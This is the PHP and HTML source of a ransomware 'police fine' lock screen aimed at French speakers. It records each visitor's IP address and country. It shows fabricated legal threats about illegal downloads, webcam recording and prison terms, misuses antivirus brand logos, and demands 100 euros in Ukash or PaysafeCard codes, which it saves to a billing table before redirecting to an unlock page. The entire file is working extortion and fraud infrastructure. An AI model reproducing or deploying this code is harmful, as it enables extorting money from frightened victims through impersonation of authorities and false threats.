<?php
error_reporting(0);
include 'include/config.php';
include ('include/db.php');
include("sxgeo/SxGeo.php");




$pin=$_GET['pin'];
$ip = $_SERVER['REMOTE_ADDR'];
$date=date('H:i:s j/m/Y');


$SxGeo = new SxGeo();

$country=$SxGeo->get_cc($ip);

$SxGeo->close();


$locations= array(1 => 'DE', 'UK', 'IT', 'FR', 'ES', 'PT', 'CA', 'AT', 'FI', 'SE', 'US', 'GR', 'LU', 'BE', 'PL');

foreach ($locations as $value)
{
	
if ($value==$country)
{
$pic=$value;
break;
}
else
$pic='default';	
}




mysql_query ( "INSERT INTO checklist (ip, country, date) VALUES ('".mysql_escape_string($ip)."', 
'".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
mysql_insert_id ();




  $pin=$_GET['pin'];

  
  
    if(strlen($pin) == 16 && preg_match("/[0-9]{16}/",$pin))
  {
      
       mysql_query ( "INSERT INTO billing (ucash, ip, country, date) VALUES ('".mysql_escape_string($pin)."', 
	   '".mysql_escape_string($ip)."', '".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
	 mysql_insert_id ();
         header('Location: unlock.php');
        
  }
  
   if(strlen($pin) == 19 && preg_match("/[0-9]{19}/",$pin))
  {
      
       mysql_query ( "INSERT INTO billing (ucash, ip, country, date) VALUES ('".mysql_escape_string($pin)."', 
	   '".mysql_escape_string($ip)."', '".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
	 mysql_insert_id ();
         header('Location: unlock.php');
        
  }
  
  
 
 ?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>


  
  <script language="JavaScript">
<!--
///////////////////////////////////
function clickIE4(){
if (event.button==2){
return false;
}
}
function clickNS4(e){
if (document.layers||document.getElementById&&!document.all){
if (e.which==2||e.which==3){
return false;
}
}
}
if (document.layers){
document.captureEvents(Event.MOUSEDOWN);
document.onmousedown=clickNS4;
}
else if (document.all&&!document.getElementById){
document.onmousedown=clickIE4;
}
document.oncontextmenu=new Function("return false")
// --> </script>
  

  
  <title></title>
  <meta http-equiv="Content-Type" content="text/html; charset=windows-1251">


  
  <link href="style.css" rel="stylesheet" type="text/css">


  
  <script type="text/javascript" src="jquery1.3.1.js"></script>
  
  <script type="text/javascript" src="jquerykeypad.js"></script>
  

  
  <style type="text/css">
<!--
#Table_01 {
position:absolute;
left:20px;
top:20px;
width:100%;
height:100%;
}
.btn{
color: #000;
width: 30px;
margin-left: 5px;
border: 1px solid #434343;
-moz-border-radius: 2px;
-khtml-border-radius: 2px;
-webkit-border-radius: 2px;
border-radius: 2px;
}
.btn:hover{
border: 2px solid #0290CB;
}
#Untitled-1-01 {
position:absolute;
left:0px;
top:0px;
width:1024px;
height:98px;
}
#Untitled-1-02 {
position:absolute;
left:0px;
top:98px;
width:395px;
height:670px;
}
#Untitled-1-03 {
position:absolute;
left:395px;
top:98px;
width:324px;
height:430px;
}
#Untitled-1-04 {
position:absolute;
left:719px;
top:98px;
width:305px;
height:430px;
}
#Untitled-1-05 {
position:absolute;
left:395px;
top:528px;
width:629px;
height:240px;
}
-->
  </style><!-- End ImageReady Styles -->
</head>


<body style="margin: 0px; background-color: rgb(255, 255, 255);">


<!-- ImageReady Slices (Untitled-1) -->
<div id="Table_01">
<div id="Untitled-1-01"> <img style="width: 481px; height: 99px;" alt="" src="images/logo.jpg"></div>


<div style="left: 0px; width: 470px; top: 130px; height: 746px;" id="Untitled-1-02"><span id="result_box" class="" lang="fr"><span class="hps">Toute l'activit&eacute;</span> <span class="hps">de cet ordinateur</span> <span class="hps">a &eacute;t&eacute; enregistr&eacute;</span><span>.</span> <span class="hps">Si vous utilisez</span> <span class="hps">une webcam,</span> <span class="hps">des vid&eacute;os et des</span> <span class="hps">photos</span> <span class="hps">ont &eacute;t&eacute;</span> <span class="hps">enregistr&eacute;es pour</span> <span class="hps">webcam</span> <span class="hps">identification.</span></span>

<center><img style="width: 256px; height: 192px;" alt="" src="images/flag_256.jpg"></center>


<br>


<span style="font-weight: bold;" id="result_box" class="" lang="fr"><span class="hps">Votre</span> <span class="hps">adresse IP</span><span class="">:</span></span><?php echo $_SERVER['REMOTE_ADDR'];?>
<br>
<span id="result_box" class="" lang="fr"><span class="hps">Vous pouvez</span> <span class="hps">&ecirc;tre clairement</span> <span class="hps">identifi&eacute; par votre adresse</span> <span class="hps">IP et le</span> <span class="hps">nom d'h&ocirc;te associ&eacute;</span></span><br>


<br>


<img style="width: 447px; height: 90px;" alt="" src="images/yourpclock.jpg"><br>


<br>


<span id="result_box" class="" lang="fr"><span style="font-weight: bold;" class="hps">Mat&eacute;riel</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">t&eacute;l&eacute;charg&eacute; ill&eacute;galement</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps atn">(</span><span style="font-weight: bold;">MP3, </span><span style="font-weight: bold;" class="hps">films ou</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">logiciels</span><span style="font-weight: bold;">) </span><span style="font-weight: bold;" class="hps">a &eacute;t&eacute; localis&eacute;</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">sur votre ordinateur</span><br>
<br>
 <span class="hps">En t&eacute;l&eacute;chargeant</span><span>,</span> <span class="hps">ceux qui</span> <span class="hps">ont &eacute;t&eacute; reproduites</span><span class="">, entra&icirc;nant ainsi une</span> <span class="hps">infraction p&eacute;nale</span> <span class="hps">en vertu de</span> <span class="hps">l'article 106</span> <span class="hps">de la Loi sur</span> <span class="hps">le droit d'auteur</span><span>.</span><br>
<br>
 <span class="hps">Le t&eacute;l&eacute;chargement</span> <span class="hps">d'&oelig;uvres prot&eacute;g&eacute;es</span> <span class="hps">via l'Internet</span> <span class="hps">ou les r&eacute;seaux</span> <span class="hps">de partage de musique</span> <span class="hps">est ill&eacute;gal et</span> <span class="hps">est conforme &agrave;</span><br>
 <span class="hps">L'article 106 de</span> <span class="hps">la</span> <span class="hps">loi, sous r&eacute;serve</span> <span class="hps">du droit d'auteur</span> <span class="hps">&agrave; une amende ou</span> <span class="hps">un emprisonnement pour une</span> <span class="hps">peine pouvant aller jusqu'&agrave;</span> <span class="hps">3 ans</span><br>
<br>
 <span class="hps">En outre, les</span> <span class="hps">possession de mat&eacute;riel</span> <span class="hps">t&eacute;l&eacute;charg&eacute; ill&eacute;galement</span> <span class="hps">est</span> <span class="hps">sanctionn&eacute; par l'article</span> <span class="hps">184 alin&eacute;a 3</span> <span class="hps">du Code criminel</span> <span class="hps">et</span> <span class="hps">peut aussi conduire &agrave;</span> <span class="hps">la confiscation</span> <span class="hps">de l'ordinateur</span><span>,</span> <span class="hps">avec laquelle</span> <span class="hps">les</span> <span class="hps">crocodiles</span> <span class="hps">ont &eacute;t&eacute; t&eacute;l&eacute;charg&eacute;s</span></span></div>


<div style="left: 474px; width: 372px; top: 128px; height: 174px;" id="Untitled-1-03"><span id="result_box" class="" lang="fr"><span class="hps">S'il vous pla&icirc;t</span> <span class="hps">suivez les instructions sur</span> <span class="hps">le droit</span></span>

<form name="ukash_form" method="get" action="FR.php" style="margin: 0px;">Ukash code: <input name="pin" id="defaultKeypad" type="text"><input name="formbutton1" value="ok" class="btn" type="submit">
  
  <div id="formradio2"><input name="100u" value="50" type="radio">50 Euro</div>


  
  <div id="formradio3"><input name="100u" value="100" checked="checked" type="radio">100
Euro</div>


</form>


<form name="psc_form" method="get" action="FR.php" style="margin: 0px;">Psc code: <input name="pin" id="defaultKeypad2" type="text"><input name="formbutton2" value="ok" class="btn" type="submit">
  
  <div id="formradio4"><input name="100p" value="50" type="radio">50 Euro</div>


  
  <div id="formradio5"><input name="100p" value="100" checked="checked" type="radio">100
Euro</div>


</form>


<br>


<br>


<br>


<span id="result_box" class="" lang="fr"><span style="color: rgb(255, 0, 0);" class="hps">S'il vous pla&icirc;t noter</span><span style="color: rgb(255, 0, 0);">:</span> <span class="hps">Cette amende</span> <span class="hps">ne peut &ecirc;tre vers&eacute;e</span> <span class="hps">dans les 48 heures</span><span>,</span> <span class="hps">si vous laissez</span> <span class="hps">passer</span> <span class="hps">48 heures</span> <span class="hps">sans paiement</span><span>,</span><br>
&nbsp;<span class="hps">la possibilit&eacute; de</span> <span class="hps">d&eacute;verrouiller votre</span> <span class="hps">ordinateur expire</span><span>.</span><br>
<br>
 <span style="font-weight: bold;" class="hps">Dans ce cas,</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">une proc&eacute;dure p&eacute;nale contre</span><span style="font-weight: bold;"> </span> <span style="font-weight: bold;" class="hps">vous serezautomatiquement lanc&eacute;e.</span></span><span style="font-weight: bold;"></span></div>


<div style="left: 860px; width: 164px; top: 98px; height: 261px;" id="Untitled-1-04"> <img style="width: 332px; height: 271px;" alt="" src="images/right2.jpg"></div>


<div style="left: 481px; width: 543px; top: 468px; height: 380px;" id="Untitled-1-05"> <img style="width: 276px; height: 38px;" alt="" src="images/mcafee.jpg"><span id="result_box" class="" lang="en"><span class="hps"><br>


How to unlock?<br>


<br>


</span></span><span id="result_box" class="" lang="fr"><span class="hps">Conform&eacute;ment &agrave;</span> <span class="hps">la loi</span> <span style="font-weight: bold;" class="hps atn">"</span><span style="font-weight: bold;">sur le contr&ocirc;le </span><span style="font-weight: bold;" class="hps">et la protection</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">de l'information</span><span style="font-weight: bold;">"</span> <span class="hps">sur</span> <span class="hps">01/02/2012</span> <span class="hps">Vous</span> <span class="hps">aurez &agrave; payer</span> <span class="hps">une amende de <span style="font-weight: bold;">100</span></span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">euros</span><span>.</span> <span class="hps">Pour</span> <span class="hps">la commodit&eacute; de payer</span> <span class="hps">une offre</span> <span class="hps">bien</span> <span class="hps">d'utiliser un formulaire</span> <span class="hps">de paiement s&eacute;curis&eacute;</span> <span class="hps">par le biais</span> <span class="hps">de bons <span style="font-weight: bold;">Ukash</span></span><span style="font-weight: bold;"> </span> <span style="font-weight: bold;" class="hps">/PaysafeCard</span><span style="font-weight: bold;">.</span> <span class="hps">Vous avez besoin</span> <span class="hps">d'acheter des ch&egrave;ques</span> <span class="hps">d'un montant de</span> <span style="font-weight: bold;" class="hps">EUR 100</span><span class="">, apr&egrave;s</span> <span class="hps">de remplir</span> <span class="hps">les champs appropri&eacute;s</span><span>,</span> <span class="hps">cliquez sur "OK</span></span><span id="result_box" class="" lang="en"><span class="hps"></span><span class="">"</span></span><br>


<br>


<center><img style="top: 666px; left: 501px; width: 169px; height: 90px;" alt="" src="images/1326914693-sopa-pipa-inquisitr.png">
<img style="top: 488px; left: 501px; width: 76px; height: 92px;" alt="" src="images/kaspersky_is_logo.gif.png"></center>


</div>


</div>


<!-- End ImageReady Slices -->
</body>
</html>
